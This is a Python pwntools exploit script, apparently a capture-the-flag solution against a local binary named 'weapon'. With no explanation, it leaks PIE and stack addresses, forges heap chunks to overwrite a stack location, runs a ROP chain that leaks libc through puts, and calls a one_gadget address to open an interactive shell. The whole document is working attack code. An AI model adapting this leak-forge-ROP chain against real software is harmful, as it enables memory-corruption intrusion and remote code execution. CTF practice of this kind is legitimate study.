from pwn import *
p = process("./weapon")
e = ELF("./weapon")
libc = ELF("/libc-2.27.so")


def buy(b):
    p.sendlineafter(":", '2')
    p.sendlineafter(":", '1')
    p.sendlineafter(":", str(b))


def check():
    p.sendlineafter(":", '3')


def input(n):
    p.sendlineafter("(y/n)", 'y')
    p.recvuntil(":")
    p.send(n)


p.recvuntil(":")

p.send('0' * 0x8)
p.recvuntil('0' * 8)
pie_base = u64(p.recv(6) + '\x00\x00') - 0x8f0
p.recv()
p.send('a' * 0x10)
p.recvuntil('a' * 0x10)
stack_base = u64(p.recv(6) + '\x00\x00')
info("pie:" + hex(pie_base))
info("stack:" + hex(stack_base))

buy(0xbfa06a)
check()
# gain money

buy(144)
buy(144)
buy(144)
buy(192)
buy(192)
buy(192)
check()

buy(192)
buy(192)
buy(192)
buy(144)
buy(144)
buy(144)
check()

buy(2000)
buy(0xbf9093)
# context.log_level = 'debug'
check()
payload = p64(0) * 7 + p64(0x31)
payload += p64(0) * 5 + p64(0x41)
payload += p64(pie_base + 0x2040B1) + p64(0) * 6
payload += p64(0x31) + p64(pie_base + 0x2040b1)
target = stack_base - 0xf8 - 0x30
# info("target:" + hex(target))
payload += p64(0) * 18 + p64(0x51) + p64(target)

input(payload)
# context.log_level='debug'
buy(0xcfa06a)
check()
# context.log_level='debug'
buy(5000)
buy(193)
buy(192)
buy(144)
buy(0xaf7ec3)
check()
'''
0x0000000000001413 : pop rdi ; ret
0x0000000000001411 : pop rsi ; pop r15 ; ret
'''
# context.log_level = 'debug'
payload = p64(pie_base + 0x1413) + p64(pie_base + e.got['puts'])
payload += p64(pie_base + e.plt['puts'])
payload += p64(pie_base + 0x1411) + p64(0) * 2
payload += p64(pie_base + 0x1195)
# payload += p64(pie_base + 0x1413) + p64(0)
# payload += p64(pie_base + 0x1411) + p64(stack_base - 0xe0) + p64(0)
# payload += p64(pie_base + e.plt['read'])
input(payload)
libc_base = u64(p.recv(6) + '\x00\x00') - libc.symbols['puts']
info("libc:" + hex(libc_base))
one_gadget = libc_base + 0x4f2c5
p_rcx = libc_base + 0x3eb0b
p.recv()
p.sendline('0' * 0x30 + p64(p_rcx) + p64(0) + p64(one_gadget))
p.interactive()
# p.recvuntil("You current order is", drop=False)
